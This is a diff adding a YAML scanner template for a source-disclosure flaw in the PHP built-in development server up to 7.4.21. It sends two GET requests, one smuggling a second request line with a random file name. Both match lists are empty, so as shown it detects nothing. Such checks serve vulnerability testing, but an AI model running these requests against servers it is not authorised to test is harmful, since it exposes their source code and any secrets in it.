@@ -1,0 +1,23 @@
+id: php-src-diclosure
+brief:
+    title: PHP Development Server <= 7.4.21 - Remote Source Disclosure
+    by: pdteam
+    level: high
+    about: A source code disclosure vulnerability in a web server caused by improper handling of multiple requests in quick succession, leading to the server treating requested files as static files instead o...
+    label:
+        - php
+        - phpcli
+        - diclosure
+        - misconfig
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      body: GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
